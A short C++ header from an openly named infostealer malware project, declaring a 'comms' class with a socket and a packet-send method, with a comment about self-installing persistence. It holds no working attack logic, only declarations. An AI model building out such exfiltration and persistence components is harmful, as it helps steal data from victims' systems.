/* 
* InfoStealer - Extracts information and interesting files from a target system.
* Copyright (C) 2023 Sebastian Hasch - <https://github.com/Zelyson/InfoStealer>
* 
* This program is free software licensed under the GNU General Public License version 3:
* you can redistribute it and/or modify it under the terms of the 
* GNU General Public License version 3 as published by the Free Software Foundation.
* 
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
*/

#pragma once

#include "../util/util.hpp"

/**
 * @brief Checks if the program is persistent and if not installs itself to the system.
 */
class comms {
private:
    SOCKET server;

public:
    int send_c(util::Packet& packet);
    comms();
    ~comms();
};